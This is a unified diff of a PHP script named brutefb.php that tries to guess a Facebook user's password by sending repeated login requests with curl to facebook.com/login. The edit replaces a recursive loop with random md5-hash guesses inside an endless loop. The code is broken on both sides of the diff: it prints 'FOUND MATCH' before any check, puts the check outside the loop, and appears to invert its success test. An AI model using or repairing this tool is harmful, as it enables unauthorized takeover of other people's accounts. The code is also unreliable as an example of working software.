@@ -13,22 +13,15 @@ if ($_SERVER["argc"] < 1) {
   print "Usage: brutefb.php <username>\n";
   exit;
 }
-function bruteForce($min, $max, $Pass)
+function bruteForce($Pass)
 {
 while(True)
 {     
-		
-	for ($i = $min; $min < $max; $i++) 
-	{        
-		if ($min < $max - 1) 
-		{    
-			bruteForce($min, $max + 1, $Pass[$i]); 	
-			echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass[$i]."\r\n";
-		}
-		check_correct($Pass[$i]);  
-        }
+	$Pass = md5(rand(0,100000));
+		echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass."\r\n";
 }
-} 
+		check_correct($Pass);  
+        }
 function check_correct($Pass)
 {
 	$c = curl_init('https://www.facebook.com/login');
@@ -45,6 +38,6 @@ function check_correct($Pass)
 	if($str != "What is on your mind?") {return true;}
         else {return false;}
 }
-bruteForce($min, $max, $Pass);
+bruteForce($Pass);
 echo "NO PASSWORD FOUND"; 
 ?>
